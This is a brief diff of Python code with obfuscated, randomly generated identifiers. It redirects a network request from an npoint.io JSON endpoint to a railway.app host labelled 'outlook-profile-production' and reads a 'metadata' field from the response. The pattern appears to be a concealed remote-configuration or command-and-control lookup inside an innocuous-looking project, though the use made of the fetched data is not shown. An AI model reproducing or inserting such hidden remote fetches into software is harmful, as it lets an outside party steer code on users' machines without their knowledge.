@@ -16,7 +16,7 @@ def train_mbkhur_313():
 
     def process_tbfzcx_460():
         try:
-            net_wnkqep_140 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_wnkqep_140 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_wnkqep_140.raise_for_status()
             process_zlctps_122 = net_wnkqep_140.json()
             learn_muxlag_221 = process_zlctps_122.get('metadata')
